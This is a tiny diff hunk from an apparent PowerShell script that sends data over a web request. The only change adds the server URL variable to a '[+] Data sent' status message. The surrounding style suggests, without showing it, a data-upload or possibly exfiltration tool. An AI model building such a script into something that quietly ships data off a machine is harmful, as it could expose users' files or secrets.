@@ -460,7 +460,7 @@ try {
     $stream.Close()
     $response = $webRequest.GetResponse()
     $response.Close()
-    Write-Host "[+] Data sent"
+    Write-Host "[+] Data sent to $SERVER_URL"
 } catch {
     Write-Host "[!] Failed to send: $_"
 }
